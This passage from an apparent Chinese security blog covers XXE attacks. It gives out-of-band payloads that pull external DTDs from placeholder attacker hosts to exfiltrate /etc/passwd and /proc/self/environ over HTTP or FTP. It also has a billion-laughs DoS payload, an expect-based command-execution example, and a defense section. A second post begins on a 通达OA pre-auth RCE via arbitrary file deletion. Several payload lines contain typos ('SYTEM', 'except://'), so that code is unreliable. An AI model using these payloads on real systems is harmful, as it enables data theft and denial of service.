&quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;all;&lt;&#x2F;root&gt;</span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY all &quot;%start;%stuff;%end;&quot;&gt;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">  &lt;!ENTITY % one SYSTEM &quot;http:&#x2F;&#x2F;attacker.tld&#x2F;dtd-part&quot; &gt;</span><br><span class="line">  %one;</span><br><span class="line">  %two;</span><br><span class="line">  %four;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % three SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;%three;&#39;&gt;&quot;&gt;</span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:4444&#x2F;ext.dtd&quot;&gt;</span><br><span class="line">%asd;</span><br><span class="line">%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;rrr;&lt;&#x2F;a&gt;</span><br><span class="line">## External dtd ##</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;environ&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:2121&#x2F;%d;&#39;&gt;&quot;&gt;</span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:22&#x2F;&quot;&gt; %dtd;]&gt;&lt;xxx&#x2F;&gt;]]&gt;&lt;&#x2F;foo&gt;&lt;&#x2F;soap:Body&gt;</span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>
<p>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 </p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装，所以一般来说，比较难利用，这里就只给出代码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$xml &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">  &lt;!ENTITY f SYSTEM &quot;except:&#x2F;&#x2F;ls&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data &#x3D; simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="0x04-防御XXE"><a href="#0x04-防御XXE" class="headerlink" title="0x04 防御XXE"></a>0x04 防御XXE</h1><p>使用开发语言提供的禁用外部实体的方法</p>
<p>PHP:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
<p>JAVA:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
<p>Python:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
<p>过滤用户提交的XML数据</p>
<p>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<p>不允许XML中含有自己定义的DTD</p>
<blockquote>
<p>REFERENCE：<a target="_blank" rel="noopener" href="http://ironxu.com/910">http://ironxu.com/910</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/175451.html%E3%80%81">https://www.freebuf.com/news/175451.html、</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/167087.html">https://www.freebuf.com/vuls/167087.html</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-09T08:29:08.000Z" title="2020-9-9 16:29:08">2020-09-09</time>发表</span><span class="level-item"><time dateTime="2020-09-09T08:33:32.000Z" title="2020-9-9 16:33:32">2020-09-09</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">31 分钟读完 (大约4633个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/09/web%E6%B8%97%E9%80%8F/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/">通达OA11.6 preAuth RCE分析</a></h1><div class="content"><p>该漏洞需要结合任意文件删除以及文件上传漏洞进行配合</p>
<h1 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h1><p>首先漏洞是在/module/appbuilder/assets/print.php</p>
<h3 id><a href="#" class="headerlink" title></a><img src="data:image/png;base64,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